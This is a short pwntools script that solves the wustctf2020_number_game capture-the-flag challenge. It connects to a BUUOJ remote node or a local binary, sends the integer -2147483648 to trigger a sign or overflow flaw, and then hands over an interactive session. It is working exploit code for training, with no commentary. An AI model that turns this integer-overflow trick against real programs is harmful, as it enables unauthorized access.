from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv


context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './wustctf2020_number_game'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',26178) if argv[1]=='r' else process(binary)

p.sendline(b'-2147483648')
p.interactive()